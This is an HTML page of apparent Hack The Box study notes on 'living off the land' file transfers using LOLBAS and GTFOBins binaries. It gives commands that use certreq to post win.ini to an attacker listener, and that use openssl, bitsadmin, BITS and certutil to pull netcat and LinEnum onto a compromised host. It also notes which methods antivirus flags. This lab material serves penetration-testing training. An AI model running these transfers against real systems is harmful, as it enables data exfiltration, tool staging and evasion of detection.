<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Living of the Land ( Binary Bypasses)</title>
</head><body>LOLBAS for Windows and GTFOBins for Linux<br/>
Search the sites f.e for upload/ddownload:<br/>
<br/>
LOLBAS(Windows):<ul><li style="list-style-type: none">Search for /upload or /download:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">https://lolbas-project.github.io/</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
For Upload f.e:<ul><li style="list-style-type: none">Start NC listener on attacking machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo nc -lvnp 8000</li>
</ul>
</li>
<li style="list-style-type: none">choose a /upload file, f.e. certreq.exe and execute it:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">C:\htb&gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini</li>
</ul>
</li>
</ul>
if an error occures , maybe it doesnt support -Post / need to download updated version here:<ul><li style="list-style-type: none">https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe</li>
</ul>
<br/>
GTFOBins(Linux) <ul><li style="list-style-type: none">Search for upload or download use:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">+file download or +file upload</li>
</ul>
</li>
<li style="list-style-type: none">example with openssl since its most of the time installed:</li>
<li style="list-style-type: none">First we need to generate a certificate on our attacking machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</li>
</ul>
</li>
<li style="list-style-type: none">Stand up the server on our attacking machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</li>
</ul>
</li>
<li style="list-style-type: none">Download File from the Compromised Machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh</li>
</ul>
</li>
</ul>
<br/>
Bitsadmin:(used download files from HTTP and SMB shares)<ul><li style="list-style-type: none">File Download:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">PS C:\htb&gt; bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe</li>
</ul>
</li>
<li style="list-style-type: none">Download:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">PS C:\htb&gt; Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
Certutil:<ul><li style="list-style-type: none">Always installed on windows and is pretty much a wget for windows BUT it is almost always detected and flaagged by antivir for malicious actions so dont use:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Download:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">C:\htb&gt; certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe</li>
</ul>
</li>
</ul>
</li>
</ul>
</body></html>